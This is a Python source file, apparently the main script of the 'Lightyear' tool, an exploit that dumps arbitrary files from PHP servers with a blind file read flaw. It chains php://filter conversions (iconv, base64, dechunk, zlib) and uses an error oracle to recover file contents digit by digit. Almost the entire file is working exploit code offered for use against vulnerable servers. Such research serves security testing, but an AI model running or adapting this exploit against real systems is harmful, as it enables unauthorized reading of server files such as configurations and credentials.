#!/usr/bin/env python3
"""
# LIGHTYEAR (cfreal)

Dump a file through a blind file read vulnerability in PHP.
See: https://www.ambionics.io/blog/lightyear-file-dump

# USAGE

To use, implement the `Remote.oracle()` method in `remote.py`.
"""

from __future__ import annotations
from abc import abstractmethod
from concurrent.futures import ThreadPoolExecutor
from functools import cache, cached_property
from itertools import product
from dataclasses import dataclass, field
import zlib

from rich.live import Live
from rich.text import Text
from rich.console import Group, RenderableType

from ten import *

from iconv import convert
from remote import Remote
from sets import DIGIT_SETS
from splitters import DIGIT_SPLITTERS
from preprenders import DIGIT_PREPENDERS

B64_DIGITS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"
HEX_DIGITS = b"0123456789abcdefABCDEF"
NON_ZERO_HEX_DIGITS = b"123456789abcdefABCDEF"
DECHUNK = "dechunk"
BIG_STEP = 208
MAX_INT = float("inf")

Byte = bytes
Digit = str
Conversion = tuple[str, str]
FilterChain = tuple[str, ...]


REMOVE_EQUAL = "convert.iconv.L1.UTF7"
B64DE = (
    "convert.base64-decode",
    "convert.base64-encode",
)


@entry
@arg(
    "path",
    "Path to the file to dump. If set to `test`, it tests if the remote class works properly.",
)
@arg(
    "output",
    "Path to the output file. If not set, the file is not stored. If set, and the file already exists, the dump will resume from where it stopped.",
)
@arg(
    "compress",
    "If set, the file is retrieved in a compressed format, which is then decompressed before being dumped. This is faster, but it requires PHP to have the `zlib` extension enabled, and it displays data in chunks instead of character by character.",
)
@arg("threads", "Number of threads. Defaults to 3.")
@arg("silent", "If set, do not display the file as it is being dumped")
@arg("debug", "If set, writes logs to debug.log")
class Exploit:
    """Dump a file through a blind file read vulnerability in PHP.
    To use, implement the `Remote.oracle()` method in `remote.py`.
    """

    path: str
    digits: list[PositionalDigit]
    """1-indexed list of digits, the first one being the starting point."""
    wrapper = (
        "convert.base64-encode",
        REMOVE_EQUAL,
    )
    handler: DataHandler
    live: Live

    def __init__(
        self,
        path: str,
        output: str = None,
        compress: bool = False,
        threads: int=3, silent: bool = False,
        debug: bool = False,
    ) -> None:
        self.path = path
        self.output = output
        self.nb_threads = threads
        self.debug = debug
        if compress:
            self.data_handler = ZlibCompressedDataHandler(self)
        else:
            self.data_handler = RawDataHandler(self)
        self.remote = Remote()
        self.digits = [BaseDigit()]
        self._display = not silent
        self._setup_output()

    def _setup_output(self) -> None:
        if not self.output:
            return
        output = Path(self.output)
        if output.exists():
            self._handle_resume()
        self._handle = output.open("wb")

    def _handle_resume(self) -> None:
        data = self.data_handler.resume(self.output)

        if not data:
            return

        msg_info(f"File exists, resuming dump at digit [b]#{len(data)}[/]")

        for digit in data:
            self.digits.append(PositionalDigit(len(self.digits), digit))

    def get_digit_value(self, filters: list[str]) -> bytes | None:
        """Gets the value of a digit by dichotomy. Returns `None` if we have hit EOF."""
        filters = self.wrapper + filters
        possible_digits = B64_DIGITS

        has_true = False

        while len(possible_digits) > 1:
            yes, no, check_filters = DIGIT_SPLITTERS[possible_digits]
            check_filters = tuple(check_filters.split("|"))
            total_filters = filters + check_filters + (DECHUNK,)

            if self.oracle(total_filters):
                log.trace(f"Oracle said no, digit is one of <{no}>")
                possible_digits = no
                has_true = True
            else:
                log.trace(f"Oracle said yes, digit is one of <{yes}>")
                possible_digits = yes

        if not has_true:
            if not self.oracle(filters):
                log.trace(f"Checking if we hit last digit")
                return None

        return possible_digits

    def oracle(self, filters: list[str]) -> bool:
        filters = self.data_handler.edit_filters(filters)
        return self.remote.has_contents(filters, self.path)

    def store_and_display_data(self, done: bool=False, interrupted: bool=False) -> None:
        """Updates the CLI and saves the data to a file if required."""
        b64 = self.base64_string()
        info = []
        info.append(("digits", len(b64)))
        
        word = done and "Dumped" or "Dumping"
            
        if self.output:
            message = f"{word} [b]{self.path}[/b] to [b]{self.output}[/b]"
            data = self.data_handler.for_output(b64)

            self._handle.seek(0)
            nb_bytes = self._handle.write(data)
            self._handle.flush()
            info.append(("bytes", nb_bytes))
        else:
            message = f"{word} [b]{self.path}[/b]"
        
        if self._display:
            string = self.data_handler.for_display(b64)
            nb_chars = len(string)
            info.append(("chars", nb_chars))

        info = ", ".join(f"[i]{nb}[/i] {type}" for type, nb in info)
        message = f"[black b]>>[/] [u]{message}[/] (got {info})"
        
        if interrupted:
            message = f"{message} [red b](interrupted)[/]"

        if self._display:
            output = Group(Text(string), message)
        else:
            output = message            

        self.live.update(output)

    def _test_remote(self) -> None:
        """Tests that the remote class created by the user is working properly."""
        should_be_false = self.remote.has_contents((), "data:,")
        should_be_true = self.remote.has_contents((), "data:,a")

        if should_be_false or not should_be_true:
            msg_failure("The remote class is not working properly")

            # Maybe they inverted the test?
            if not should_be_true and should_be_false:
                msg_info(
                    "The test is inverted, you should return `True` when the data is not empty"
                )
            else:
                msg_info(f"This should be false: {should_be_false}")
                msg_info(f"This should be true: {should_be_true}")
        else:
            msg_success("The remote class is working [b]properly[/]!")

        # Testing if zlib.deflate is supported by the remote server
        # We try to compress an empty string: if zlib.deflate is not supported, the
        # remote server will yield an error and return an empty string. If it is, it
        # will yield a few bytes. The additional base64-encode is to ensure that
        # the output is ASCII, and we don't encounter unexpected issues with decoding or
        # anything.
        should_be_true = self.remote.has_contents(
            ("zlib.deflate", "convert.base64-encode"), "data:,"
        )

        if not should_be_true:
            msg_warning(
                "The remote class [b]does not support[/] zlib.deflate, which is required for "
                "compressed dumps."
            )
        else:
            msg_success(
                "The remote class [b]supports[/] zlib.deflate, which is required for "
                "compressed dumps."
            )
            msg_success("Use [code]-c[/] to enable compression.")

        leave()
        
    def _worker(self, index: int) -> None:
        while self._continue:
            try:
                return self.get_digit(index)
            except (NoJumpException, NoPathException):
                sleep(.01)
        
        return None

    def run(self) -> None:
        """Multithreaded digit dump: each worker gets a unique i, stops at EOF."""
        if self.debug:
            logging.set_file("./debug.log")

        if self.path == "test":
            self._test_remote()
            return

        if not (self._display or self.output or self.debug):
            failure(
                "Cannot run in silent mode without an output file, as you will not get "
                "anything out of it."
            )

        self.live = Live("-", console=get_console(), transient=False)
        self.store_and_display_data()
        self.live.start()
            
        self._continue = True
        interrupted = False
        
        try:            
            with ThreadPoolExecutor(max_workers=self.nb_threads) as executor:
                futures = {}
                
                def queue_digit(i):
                    futures[i] = executor.submit(self._worker, i)
                
                # Queue the first 4 digits, as they can be obtained by swapping
                
                current_idx = len(self.digits)
                for i in range(4):
                    queue_digit(current_idx + i)

                while True:
                    digit = futures.pop(current_idx).result()

                    # We reached EOF: exit
                    if digit is None:
                        break
                    
                    queue_digit(current_idx+4)
                    
                    self.digits.append(digit)
                    self.store_and_display_data()
                
                    current_idx += 1
                
                # Ask workers to exit and cancel remaining futures
                self._continue = False
                executor.shutdown(cancel_futures=True)
        except KeyboardInterrupt:
            interrupted = True
        finally:
            self.store_and_display_data(done=True, interrupted=interrupted)
            self.live.stop()

    def base64_string(self) -> str:
        return "".join(digit.digit for digit in self.digits[1:])

    def _debug_check_expected(self, path: DigitPath, digit: bytes) -> None:
        """Debug function that checks that the digit we got is the one we expected."""
        if not hasattr(self, "_debug_expected_digits"):
            self._debug_expected_digits = base64.encode(read_bytes(self.path))

        ending = False
        try:
            expected = self._debug_expected_digits[len(self.digits) - 1]
        except IndexError:
            ending = True
        if not ending and expected == "=":
            ending = True
        if not ending and expected != digit:
            msg_info(f"Before: {self.base64_string()}")
            msg_info(f"To rollback: {'|'.join(path.set.back)}")
            failure(f"Expected {expected}, got {digit}")

    def get_digit(self, i: int) -> PositionalDigit | None:
        log.info(f"Dumping digit #{i}")

        path = self.get_best_path(i)
        digit = self.get_digit_value(path.filters + path.set.back)

        if digit is None:
            return None

        # self._debug_check_expected(path, digit)

        positional_digit = PositionalDigit(i, digit)
        log.info(f"Got #{positional_digit.index} <{positional_digit.digit}>")

        for previous_digit in self.digits[:i]:
            previous_digit.update_breakable(i, positional_digit.digit)

        return positional_digit

    def _neighbours(self, p: int) -> list[PositionalDigit]:
        """Every node we can jump from to reach p."""
        # The further point we can start from is the last time we saw the digit we are
        # trying to dechunk. Since we aim to convert that digit to a newline, and then
        # dechunk to remove it, if there is the same digit in between the jump position
        # and us, it will also be a newline, and thus the dechunk will get rid of the
        # latter, and not the former.
        # Careful, digits are 1-indexed
        digit = self.digits[p]
        furthest = self.base64_string().rfind(digit.digit, 0, p - 1)
        neighbours = [self.digits[i + 1] for i in range(furthest, p - 1)]
        neighbours = [nbr for nbr in neighbours if nbr.has_reversable_set()]
        return neighbours

    def get_swap_path(self, target: int) -> DigitPath:
        BASE_SET = DIGIT_SETS["<START>"]

        SWAPS = {
            2: ("convert.iconv.utf16be.utf16le",),
            3: (
                "convert.iconv.ucs-4be.ucs-4le",
                "convert.iconv.utf16be.utf16le",
            ),
            4: ("convert.iconv.ucs-4be.ucs-4le",),
        }

        for offset, swap in SWAPS.items():
            try:
                landing = self.digits[target - offset]
            except IndexError:
                continue
            if not landing.has_reversable_set():
                continue
            try:
                jump = self.get_or_compute_jump(landing, target)
            except NoJumpException:
                continue
            else:
                log.debug(f"#{target} Using swap path -{offset}")
                # The decode-encode chain ensures that we've got a multiple of 4 bytes
                return DigitPath(
                    BASE_SET,
                    jump.filter_chain(target) + landing.set.back + B64DE + swap,
                )

        raise NoPathException(f"No swap path available for {target=}")

    def compute_jump(self, landing: PositionalDigit, target: int) -> JumpDescription:
        """Compute the best way to jump to the digit at offset `target`."""
        assert target >= len(self.digits)

        if not landing.has_set():
            raise NoJumpException(f"No digit set for {landing.digit}")

        best_jump = None
        best_distance = MAX_INT

        # Try once with "safe" neighbours, and if it fails, try to compute better paths
        neighbours = self._neighbours(landing.index)

        for try_harder in (False, True):
            for trampoline in neighbours:
                # msg_warning(f"Trying to jump from #{trampoline.index} to #{landing.index}")
                if try_harder:
                    # msg_warning(f"Trying to compute safe jump #{trampoline.index} to #{landing.index}")
                    try:
                        jump = self.compute_jump(trampoline, target)
                    except NoJumpException:
                        continue
                    else:
                        trampoline.add_jump(jump)
                elif not trampoline.has_safe_jump(target):
                    continue
                known, chunk_size, filters = self.build_dechunk_filters(
                    trampoline.set,
                    landing.set,
                    trampoline.index + 1,
                    landing.index,
                    target,
                )
                # If the digit is known, we don't need to add a breakage position
                if known:
                    breakage_position = None
                    breakage_digit = None
                else:
                    breakage_position = landing.index + 1 + chunk_size
                    breakage_digit = landing.digit

                jump = JumpDescription(
                    trampoline, filters, breakage_position, breakage_digit
                )

                try:
                    distance = jump.distance(target)
                except NoJumpException:
                    if try_harder:
                        msg_info("FUCKING HELL WHAT")
                        jump.debug_recurse_dump()
                        assert 0
                    msg_warning(f" -> NO JUMP ({jump.breakable_position}) ({target})")
                    continue

                if distance < best_distance:
                    # log.trace(f"Found min jump from #{trampoline.index} to #{landing.index}")
                    best_distance = distance
                    best_jump = jump

            if best_jump:
                break

        if not best_jump:
            raise NoJumpException(f"No jump available for {target=}")

        return best_jump

    def get_or_compute_jump(
        self, digit: PositionalDigit, target: int
    ) -> JumpDescription:
        """Compute the best way to jump to the digit `digit` while being able to reach
        `target`.
        """
        try:
            return digit.get_safe_jump(target)
        except NoJumpException:
            pass

        try:
            jump = self.compute_jump(digit, target=target)
        except NoJumpException:
            raise
        else:
            digit.add_jump(jump)
            # msg_info(
            #     f"Added jump to #{digit.index} <{digit.digit}>"
            # )
            # jump.debug_describe(target)
            # print(f"ROLLBACK: {'|'.join(digit.set.back)}")
            return jump

    def get_best_path(self, p: int, decache: bool = True) -> DigitPath:
        """Compute the best way to reach the digit at offset `p`."""

        # The simplest way to pull this off is to use a jump from a digit right before

        if p - 1 < len(self.digits):
            previous = self.digits[p - 1]
            try:
                jump = self.get_or_compute_jump(previous, p)
            except NoJumpException:
                pass
            else:
                jump_idx = f"#{jump.parent.index}" if jump.parent else "start"
                log.debug(f"Found path using jump from {jump_idx} to #{p}")
                return DigitPath(previous.set, jump.filter_chain(p))

        # Otherwise, we can perform a swap

        try:
            return self.get_swap_path(p)
        except NoPathException:
            pass

        raise NoPathException(f"No path available for {p=}")

    def get_chunk_size(self, set: DigitSet, start: int, end: int) -> str:
        """Returns the value of the hexadecimal chunk header at position `p`."""
        value = ""
        if start == -1:
            start = 0
        for i in range(start, end):
            digit = set.from_base(self.digits[i].digit)

            if digit not in HEX_DIGITS:
                break

            value += chr(digit)
        return value

    def _is_safe_position(self, set: DigitSet, target: int, p: int) -> bool:
        """Is it safe to be in `set` when at position `p`, considering we want to reach
        `target`?
        """
        try:
            # If the digit is a newline in the wanted set, it is not safe
            return self.digits[p].digit != set.digit
        except IndexError:
            # Since we don't know the value of the digit, we cannot state, and thus only
            # consider it safe if it is after the target
            return p > target

    def build_dechunk_filters(
        self, set_from: DigitSet, set_to: DigitSet, start: int, end: int, target: int
    ) -> tuple[bool, int, FilterChain]:
        """Computes the filters required to convert from `set_from` to `set_to`, while
        making sure that the chunk has valid, hexadecimal, non null, size header.
        In addition, the chunk header is chosen to be as small as possible, while making
        sure that the target digit is before the end of the chunk.

        Returns the size of the chunk header and the filters.
        """
        # TODO It would be nice to be able to optimise the case where
        # set_from == set_to, by avoiding going back to the original digit set
        # But it sounds hard to do so: the digit set is messy (lots of >0x7f bytes,
        # but not only that), so adding a prefix "raw" will probably not work.
        # Therefore, we need to convert to B64, but this requires alignment, and
        # costs 4 chars minimum, as we cannot misalign the output.
        # A strategy that I had in mind:
        # QPE, S4, L1->ISO-2002-KR, S4, QPD
        # It costs 150 chars (which is already quite a lot compared to the "stupid")
        # technique, but it requires the data to be divisible by 4 after the QPE,
        # which is not garantied
        # if set_from == set_to:
        #     ...

        # We have two things to handle: maybe converting from one digit set to another,
        # and maybe having to write a hexdigit in the front of the chain before we
        # dechunk it

        base_chunk_size_hex = self.get_chunk_size(set_to, start, end)
        base_chunk_size_int = ihex(base_chunk_size_hex)

        # Maybe, by sheer luck, in the destination digit set, the chunk header is
        # already there, and we are already in the right digit set
        chunk_end = end + 1 + base_chunk_size_int
        if (
            base_chunk_size_int
            and self._is_safe_position(set_to, target, chunk_end)
            and set_from == set_to
        ):
            known = chunk_end < len(self.digits)
            return known, base_chunk_size_int, (DECHUNK,)

        # We want the b64 digit to be hexadecimal in the destination digit set,
        # while as usual minimizing conversion cost.
        digit_filters = set_to.add_hex_digit_options()

        # Let's find the smallest addition that makes it safe
        # We have a set of conversions that can add a hex digit at the beginning of the
        # base64 string, and we want to find the smallest one that makes it safe to jump
        # to the target digit.
        # We thus try without any addition (maybe there is already a valid chunk header)
        # then with one hex digit added, then with two, etc.
        # I don't think we'll ever reach 8, but we never know
        for repeat in range(8):
            for digits in product(digit_filters, repeat=repeat):
                chunk_size_hex = "".join(digits * repeat) + base_chunk_size_hex
                chunk_size_int = ihex(chunk_size_hex)
                chunk_end = end + 1 + chunk_size_int

                if chunk_size_int and self._is_safe_position(set_to, target, chunk_end):
                    known = chunk_end < len(self.digits)
                    filters = sum((digit_filters[digit] for digit in digits), ())
                    filters = set_from.back + filters + set_to.forward + (DECHUNK,)

                    return known, chunk_size_int, filters

        raise NoPathException(f"No proper option to change the value {set_to.digit}")


class NoPathException(Exception):
    """Raised when we cannot find a path to a digit."""


class NoJumpException(Exception):
    """Raised when we cannot find a jump."""


@dataclass(frozen=True)
class DigitSet:
    """An alternative representation of the base64 digits, where `digit` is a newline.
    This digit set can be obtained by applying the `conversions` to the original base64
    digit set.
    """

    digit: str
    """Digit of the original charset that is a newline."""
    conversions: tuple[Conversion]
    """A list of character set conversions that convert the original base64 digit set to
    this one.
    """
    reversable: bool
    """True if we can convert back to the original digit set."""

    @staticmethod
    def _to_filter(conversion: Conversion) -> str:
        filter = f"convert.iconv.{conversion[0]}.{conversion[1]}"
        return filter

    @cached_property
    def forward(self) -> str:
        return tuple(map(self._to_filter, self.conversions))

    @cached_property
    def back(self) -> str:
        return tuple(
            map(self._to_filter, ((x[1], x[0]) for x in reversed(self.conversions)))
        )

    @cached_property
    def state(self) -> bytes:
        """The set of 64 digits."""
        state = B64_DIGITS.encode()
        for cfrom, cto in self.conversions:
            state = convert(cfrom, cto, state)
        return state

    def to_base(self, digit: Byte) -> str:
        return B64_DIGITS[self.state.index(digit)]

    def from_base(self, digit: str) -> str:
        return self.state[B64_DIGITS.index(digit)]

    def has_non_zero_hex_digit(self) -> bool:
        """Does the digit set contain a non zero hexadecimal digit?"""
        return any(digit in NON_ZERO_HEX_DIGITS for digit in self.state)

    @cache
    def add_hex_digit_options(self) -> dict[str, FilterChain]:
        """Finds the filter chains that can add hex digits to the digit set.

        To be able to dechunk, we need to have an hex digit before the newline. It will
        sometimes already be present in the data, but in most cases, we'll need to add
        it ourselves. To do so, we switch the digitset back to the original b64 digit
        set, and add a digit that is hexadecimal in the current digit set.

        We pick the best digit to add, i.e. the one that requires the smallest filter
        chain. In addition, we pick a second one, in case the first one would make us
        land on the target digit.
        """
        couples = [
            (chr(digit), DIGIT_PREPENDERS[B64_DIGITS[p]] + B64DE + (REMOVE_EQUAL,))
            for p, digit in enumerate(self.state)
            if digit in NON_ZERO_HEX_DIGITS
        ]

        if not couples:
            raise Exception(f"DigitSet has no hex digit: {self.digit}")

        return dict(sorted(couples, key=lambda couple: len(couple[1])))


DIGIT_SETS = {
    digit: DigitSet(digit, conversions, reversable)
    for digit, conversions, reversable in DIGIT_SETS
}
DIGIT_SETS = {
    digit: set
    for digit, set in DIGIT_SETS.items()
    if set.has_non_zero_hex_digit() and set.reversable
}

# This one cause problems which I haven't investigated yet
del DIGIT_SETS["L"]


@dataclass
class JumpDescription:
    """A list of filters that can be used to jump from `parent` to a digit that comes
    later in the base64 string.
    """

    parent: PositionalDigit
    """The digit we jumped from."""
    filters: tuple[str]
    """Filters used to get there from `JumpDescription.parent`."""
    breakable_position: int
    """Position of the end of the chunk. If `None`, there is not limitation."""
    breakable_digit: Digit
    """Value of the digit that we need to be careful about. If `None`, and the position
    is not, we cannot go further.
    """

    def update_breakable(self, p: int, digit: Digit) -> bool:
        """Called when we have an update about the value of the digit at position `p`.
        If the digit is the one we need to be careful about, we can now determine if we
        were right to worry or not.
        """
        if self.breakable_digit is not None and self.breakable_position == p:
            # Once we have an update, no need to handle this digit again
            if self.breakable_digit == digit:
                # We have a problem!
                log.info(f"Breakable digit at #{p} has BAD value <{digit}> !")
                self.breakable_digit = None
            else:
                # msg_warning(
                #     f"{id(self):#x} Breakable digit at #{p} has safe value <{digit}>!"
                # )
                self.breakable_digit = None
                self.breakable_position = None
                return True

        return False

    def _can_reach(self, p: int) -> bool:
        """Can we safely jump to position `p`?"""
        return self.breakable_position is None or self.breakable_position > p

    def can_reach(self, p: int) -> bool:
        """Can we safely jump to position `p`?"""
        # msg_warning(f"Checking if we can jump to {p} ({self.breakable_position})")
        return self._can_reach(p) and self.parent.has_safe_jump(p)

    def filter_chain(self, target: int) -> FilterChain:
        """Produces a complete filter chain to reach `target`, which involves jumping to
        the parent, and then jumping from the parent to the target.
        """
        if not self._can_reach(target):
            raise NoJumpException
        return self.parent.get_safe_jump(target).filter_chain(target) + self.filters

    def distance(self, target: int) -> int:
        """Returns the length of the filter chain required to reach `target`. We're 
        looking to minimize this value.
        """
        return len("|".join(self.filter_chain(target)))

    def debug_describe(self, target: int) -> None:
        """Horrible, terrible, ugly debug function. Do not read it."""
        parent = self.parent
        parents: list[PositionalDigit] = []
        error = None
        while parent:
            parents.insert(0, parent)
            try:
                parent = parent.get_safe_jump(target).parent
            except NoJumpException:
                error = parent
                break
                # raise RuntimeError("This should not happen")

        msg_info(f"The jump path is {len(parents)}:")
        if error:
            msg_failure(f"A jump caused problems: {error.index=}")
            for jj in error.jumps:
                print("  jump", jj.breakable_position, jj.breakable_digit)
        for parent in parents:
            if parent.index == -1:
                print("  #START")
                continue
            jmp = parent.get_safe_jump(target)
            print(
                f"  #{parent.index:5d} (avoid={jmp.breakable_position} <{jmp.breakable_digit}>) {fc(jmp.filters)}"
            )
            print(f"  R         {fc(parent.set.back)}")

        if error:
            msg_failure(f"A jump caused problems: {error.index=}")
            for jj in error.jumps:
                print("  jump", jj.breakable_position, jj.breakable_digit)
        else:
            print("  #XXXXX " + fc(self.filters))

    def debug_recurse_dump(self, indent: int = 0) -> None:
        """Another horrible, terrible, ugly debug function. Do not read it either."""
        si = "    " * indent
        print(f"{si}JUMP bd={self.breakable_digit} bp={self.breakable_position}")
        if self.parent:
            print(
                f"{si}PARENT idx={self.parent.index} cache={self.parent._cache[0] if self.parent._cache else None}"
            )
            for jj in self.parent.jumps:
                jj.debug_recurse_dump(indent + 1)


@dataclass
class DigitPath:
    """The path to a digit, along with the digit set that produced it."""

    set: DigitSet
    """Digit set that we are in after processing the filters."""
    filters: tuple[str]
    """Filters used to get there."""


@dataclass
class PositionalDigit:
    """A digit of the base64 string, with information about the jumps that can be made
    to land right onto it. These jumps can let us dump the 4 digits that come after.
    """

    index: int
    """Position of the digit in the base64 string."""
    digit: Digit
    """Value of the digit."""
    jumps: list[JumpDescription] = field(default_factory=list, init=False)
    """Lists of jump paths that land on this digit.
    """
    _cache = (-1, None)

    def get_safe_jump(self, target: int) -> JumpDescription | None:
        """Returns the best jump to this digit that do not have a breakable position
        that comes before `target`.
        """
        # This is very useful, but maybe requires a bit of documentation / thinking
        # If the parent path changes, it is not reflected...
        if self._cache[0] >= target:
            assert (
                self._cache[1].breakable_position is None
                or self._cache[1].breakable_position > target
            )
            return self._cache[1]

        min_jump = None
        min_distance = MAX_INT

        for jump in self.jumps:
            try:
                distance = jump.distance(target)
            except NoJumpException:
                continue
            if distance < min_distance:
                min_jump = jump
                min_distance = distance

        if min_jump:
            self._cache = (target, min_jump)
            return min_jump

        raise NoJumpException

    def has_safe_jump(self, target: int) -> bool:
        """Do we have a jump that let us reach `target`?"""
        return any(jump.can_reach(target) for jump in self.jumps)

    def add_jump(self, jump: JumpDescription) -> None:
        self.jumps.append(jump)

    def update_breakable(self, p: int, digit: Digit) -> None:
        """Update the breakable positions for each jump."""
        for jump in self.jumps:
            jump.update_breakable(p, digit)

    @property
    def set(self) -> DigitSet:
        """A digit set in which this digit is a newline."""
        return DIGIT_SETS[self.digit]

    def has_set(self) -> bool:
        """Do we have a digit set for this digit?"""
        return self.digit in DIGIT_SETS

    def has_reversable_set(self) -> bool:
        """Do we have a reversable digit set for this digit?"""
        return self.has_set() and self.set.reversable


class BaseDigit(PositionalDigit):
    """Before the very first digit."""

    def __init__(self):
        super().__init__(0, "<START>")
        self.add_jump(BaseJumpDescription())


class BaseJumpDescription(JumpDescription):
    """A jump from the beginning of the base64 string to a digit."""

    def __init__(self):
        super().__init__(None, (), None, None)

    def can_reach(self, target: int) -> bool:
        """Can we safely jump to position `target`?"""
        return True

    def filter_chain(self, p: int) -> tuple[str]:
        return ()

    def update_breakable(self, p: int, digit: Digit) -> None:
        pass


@dataclass
class DataHandler:
    exploit: Exploit

    @abstractmethod
    def edit_filters(self, filters: list[str]) -> list[str]:
        """Adds filters to the filter chain."""

    @abstractmethod
    def for_output(self, data: str) -> bytes:
        """Returns the data as bytes for it to be stored to a file."""

    @abstractmethod
    def for_display(self, data: str) -> str:
        """Returns the data as a string, for it to be displayed."""

    @abstractmethod
    def resume(self, path: str) -> str:
        """Returns the base64 digits of the data that has already been dumped."""


@dataclass
class RawDataHandler(DataHandler):
    def edit_filters(self, filters: tuple[str]) -> tuple[str]:
        return filters

    def for_output(self, data: str) -> bytes:
        match len(data) % 4:
            case 0:
                pass
            case 1:
                data += "A=="
            case 2:
                data += "=="
            case 3:
                data += "="

        data = base64.decode(data)
        return data

    def for_display(self, data: str) -> str:
        data += "A" * (4 - len(data) % 4)
        data = base64.decode(data)
        data = data.decode("utf-8", "replace")
        return data

    def resume(self, path: str) -> str:
        data = Path(path).read_bytes()
        data = base64.encode(data)
        if data.endswith("=="):
            data = data[:-3]
        elif data.endswith("="):
            data = data[:-2]
        return data


@dataclass
class ZlibCompressedDataHandler(DataHandler):
    GZ_B64_EXT = ".gz.b64"

    def edit_filters(self, filters: tuple[str]) -> tuple[str]:
        return ("zlib.deflate",) + filters

    def for_output(self, data: str) -> bytes:
        if self.exploit.output:
            Path(self.exploit.output + self.GZ_B64_EXT).write_text(data)

        remove_offset = len(data) - (len(data) % 4)
        data = data[:remove_offset]

        data = base64.decode(data)
        obj = zlib.decompressobj(-zlib.MAX_WBITS)
        try:
            data = obj.decompress(data)
        except zlib.error as e:
            log.error(f"Decompression error", exc_info=True)
            data = b"<unable to decompress>"
        return data

    def for_display(self, data: str) -> str:
        return self.for_output(data).decode("utf-8", "replace")

    def resume(self, path: str) -> str:
        data = Path(path + self.GZ_B64_EXT).read_text()
        return data


def fc(filters: list[str]) -> str:
    return "|".join(filters)


def ihex(value: str) -> int:
    """Converts a chunk header to an integer."""
    if not value:
        return 0
    # We don't really expect any number to wrap, but we might as well be precise
    return int(value, 16) & 0xFFFF_FFFF_FFFF_FFFF


Exploit()
